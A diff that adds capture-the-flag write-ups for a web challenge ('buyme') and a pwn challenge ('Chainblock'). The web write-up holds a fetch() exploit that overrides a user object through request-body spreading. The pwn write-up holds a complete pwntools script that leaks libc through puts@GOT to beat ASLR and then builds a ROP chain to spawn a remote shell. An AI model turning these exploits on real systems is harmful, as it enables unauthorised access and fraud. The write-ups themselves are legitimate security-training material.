@@ -403,3 +403,243 @@ giving us the result:
 `b'corctf{1_b3t_y0u_d1dnt_4ctu411y_d0_th3_m4th_d1d_y0u?}\ncorctf{1_b3t_y0u_d1dnt_4ctu411y_d0_th3_m4th_d1d_y0u?}\ncorctf{1_b3t_y0u_d1dnt_4ctu411y_d0_th3_m4th_d1d_y0u?}\ncorctf{1_b3t_y0u_d1dnt_4ctu411y_d0_th3_m4th_d1d_y0u?}\ncorctf{1_b3t_y0u_d1dnt_4ctu411y_d0_th3_m4'`
 
 Flag: corctf{1_b3t_y0u_d1dnt_4ctu411y_d0_th3_m4th_d1d_y0u?}
+
+## buyme
+
+Category: Web
+Points: 441
+
+We are given a flag-buying store with a register/login system and our objective is to acquire the `corCTF` flag which costs 1e+300 dollars and we are given starting amount of $100. I've completely missed that we were given the source code for the problem during the competition (just ignore me pls). If we take a look at [api.js](Web/buyme/chall/routes/api.js) we can see the /buy API endpoint:
+
+~~~js
+router.post("/buy", requiresLogin, async (req, res) => {
+    if(!req.body.flag) {
+        return res.redirect("/flags?error=" + encodeURIComponent("Missing flag to buy"));
+    }
+
+    try {
+        db.buyFlag({ user: req.user, ...req.body });
+    }
+    catch(err) {
+        return res.redirect("/flags?error=" + encodeURIComponent(err.message));
+    }
+
+    res.redirect("/?message=" + encodeURIComponent("Flag bought successfully"));
+});
+~~~
+
+The vulnerability here is actually the destructuring ("...") of the req.body. If we follow the call to buyFlag in [db.js](Web/buyme/chall/db.js) we can see the it performs a check for if `user.money` is greater or equal to the flag price for the user to buy it. The way destructuring is that if req.body happens to be an object it will unpack the values inside that object. Thus, we can override the `user` object provided by the browser with our own user object with arbitary amounts of money.
+
+~~~js
+const buyFlag = ({ flag, user }) => {
+    if(!flags.has(flag)) {
+        throw new Error("Unknown flag");
+    }
+    if(user.money < flags.get(flag).price) {
+        throw new Error("Not enough money");
+    }
+
+    user.money -= flags.get(flag).price;
+    user.flags.push(flag);
+    users.set(user.user, user);
+};
+~~~
+
+Since the /buy API endpoint requires for the user to be logged in, we can write the exploit code in Javascript using the `fetch` function to buy the corCTF flag with our custom user object and enter it in the Developer Console to run it directly from the browser.
+
+The exploit would look like this:
+
+~~~js
+let username = "gray2"; //change depends on user currently logged in
+
+let data = {
+    flag: "corCTF",
+    user: {
+     user: username,
+     flags: [],
+     money: 2e+300,
+    }
+};
+
+fetch("https://buyme.be.ax/api/buy", {
+  method: "POST", 
+  body: JSON.stringify(data),
+  headers: {
+    "Content-Type": "application/json"
+  }
+}).then(res => {
+  console.log("Request complete! response:", res);
+});
+~~~
+
+We had modeled the structure of the `user` object based on what the browser creates at the /register API endpoint:
+
+~~~js
+db.users.set(user, {
+    user,
+    flags: [],
+    money: 100,
+    pass: await bcrypt.hash(pass, 12)
+});
+~~~
+
+When we refreshed the page we are greeted with the content of the flag.
+
+Flag: corctf{h0w_did_u_steal_my_flags_you_flag_h0arder??!!}
+
+## Chainblock
+
+Category: Pwn
+Points: 394
+
+This problem was a nice introduction for me to working with binaries that has ASLR (Address space layout randomization) enabled. Initially, both me and Michael (who were doing corCTF with me) had thought that this was a simple ret2libc problem without ASLR.
+
+The main vulnerability of the program is in the use of `gets()` in the `verify` function without specifying a character limit. 
+
+
+~~~c
+char* name = "Techlead";
+int balance = 100000000;
+
+void verify() {
+	char buf[255];
+	printf("Please enter your name: ");
+	gets(buf);
+
+	if (strcmp(buf, name) != 0) {
+		printf("KYC failed, wrong identity!\n");
+		return;
+	}
+
+	printf("Hi %s!\n", name);
+	printf("Your balance is %d chainblocks!\n", balance);
+}
+~~~
+
+Using gdb, we were able to figure out that it would take a padding of 264 characters from the start of the `buf` array to just before the return pointer. Initially, Michael and I had tried to call `system('/bin/sh')` using a `pop rdi; ret` gadget and returning to the system function in libc, but this would only work on the local binary when ASLR is disabled. 
+
+~~~py
+pop_rdi = 0x0000000000401493 # pop rdi; ret
+bin_sh = next(libc.search(b"/bin/sh"))
+ret_gadget = 0x000000000040101a # ret
+system_addr = libc.symbols["system"]
+print("System addr:",hex(system_addr))
+print("Bin_sh addr:",hex(bin_sh))
+
+rop_chain = [
+    pop_rdi, bin_sh, ret_gadget, system_addr
+]
+~~~
+
+Note that I had to include another `ret` gadget after the address for the string "/bin/sh", because while debugging with gdb I found that my program keeps crashing at `movaps xmmword ptr [rsp + 0x40], xmm0` instruction after entering `system`. From this [ref](https://stackoverflow.com/questions/60729616/segfault-in-ret2libc-attack-but-not-hardcoded-system-call), I saw that it has something to do with the stack alignment expecting things to be aligned in 16-byte blocks, and since our `pop rdi` operation had pushed the stack 8 bytes forward it would result a SEGFAULT error when the program performed the stack alignment check. Performing another `ret` then helped get our stack alignment back in order.
+
+To get around ASLR, the main strategy is to expose some address information that we can use to calculate where our target functions are in relation to that. In our case, I found this helpful [tutorial](https://codingvision.net/bypassing-aslr-dep-getting-shells-with-pwntools) which tells us to:
+
+1. Set the return pointer to the main function. ASLR only randomizes the heap stack and the offsets where are mapped the libraries (such as libc) when the binary is initially launched into execution. Thus, us calling main once again will still keep the address map as-is.
+2. Use a `pop rdi; ret` gadget to execute `puts(puts@GOT)` which will output the address of `puts@libc`. The outside `puts` uses the address to puts in the PLT table whereas the inside is the addresss entry for puts in the GOT table. This is because (I believe), puts@plt is the callable address for puts where puts@GOT is actually an offset entry which helps us resolve the address of puts@libc.
+3. Retrieve the outputted address and subtract the offset of `puts@libc` to get the actual libc starting address
+4. From there, perform the ret2libc attack as before.
+
+
+The tutorial also provided some objdump commands (as an alternative to gdb) that I've included below to the find address of some functions:
+
+~~~text
+$ objdump -R chainblock
+
+chainblock:     file format elf64-x86-64
+
+DYNAMIC RELOCATION RECORDS
+OFFSET           TYPE              VALUE 
+0000000000403ff0 R_X86_64_GLOB_DAT  __libc_start_main@GLIBC_2.2.5
+0000000000403ff8 R_X86_64_GLOB_DAT  __gmon_start__
+0000000000404060 R_X86_64_COPY     stdout@@GLIBC_2.2.5
+0000000000404018 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.5
+
+$ objdump -d -M intel  chainblock | grep "puts@plt"
+0000000000401080 <puts@plt>:
+  40120e:	e8 6d fe ff ff       	call   401080 <puts@plt>
+
+
+gef➤  disas main
+Dump of assembler code for function main:
+=> 0x000000000040124b <+0>:	endbr64 
+
+*] Switching to interactive mode
+ Hi Techlead!
+Your balance is 100000000 chainblocks!
+\xd09A\xae\x80\x7f <-- this is Python's prettified printing of the output
+
+$ objdump -d -M
+ intel libc.so.6 | grep "_IO_puts"
+   7eaa1:	e8 0a 21 00 00       	call   80bb0 <_IO_puts@@GLIBC_2.2.5+0x1e0>
+~~~
+
+Putting this all together, we get the following exploit script, also found at [aslr_lead](Pwn/Chainblock/aslr_leak.py):
+
+~~~py
+from pwn import *
+import os
+
+run_locally = False
+os.chdir("./cor_ctf/Pwn/Chainblock")
+
+elf = ELF("./chainblock")
+
+if run_locally:
+    p = elf.process()
+else:
+    host = "pwn.be.ax"
+    port = 5000
+    p = remote(host,port)
+
+print(p.recvuntil("name:").decode('utf-8'))
+
+libc = ELF("libc.so.6")
+
+pop_rdi_ret = 0x0000000000401493
+puts_got_addr = 0x0000000000404018
+puts_plt_addr = 0x401080
+main_addr = 0x000000000040124b
+
+
+rop_chain = [
+    pop_rdi_ret, puts_got_addr, puts_plt_addr, main_addr
+]
+
+rop_chain = b''.join([ p64(entry) for entry in rop_chain])
+
+payload = b'Techlead' + b'\x00' + b'A'*(16*16-1) + rop_chain
+#payload = b'A'*264 + rop_chain
+
+p.sendline(payload)
+print(p.recvline().decode('utf-8'))
+print(p.recvline().decode('utf-8'))
+
+aslr_puts_addr = u64((p.recvline()[:-1] + b'\x00\x00')[:8])
+print("ASLR puts addres:",hex(aslr_puts_addr))
+print(p.recvuntil('name:').decode())
+
+#Leaked puts@libc address = \xb0\xa7\x7f
+libc.address = aslr_puts_addr - libc.symbols['puts']
+
+pop_rdi = 0x0000000000401493 # pop rdi; ret
+bin_sh = next(libc.search(b"/bin/sh"))
+ret_gadget = 0x000000000040101a # ret
+system_addr = libc.symbols["system"]
+print("System addr:",hex(system_addr))
+print("Bin_sh addr:",hex(bin_sh))
+
+rop_chain = [
+    pop_rdi, bin_sh, ret_gadget, system_addr
+]
+
+rop_chain = b''.join([ p64(entry) for entry in rop_chain])
+print(rop_chain)
+print(len( b'Techlead' + b'\x00' + b'A'*(16*16-1)))
+
+payload = b'Techlead' + b'\x00' + b'A'*(16*16-1) + rop_chain
+
+p.sendline(payload)
+p.interactive()
+p.close()
+~~~
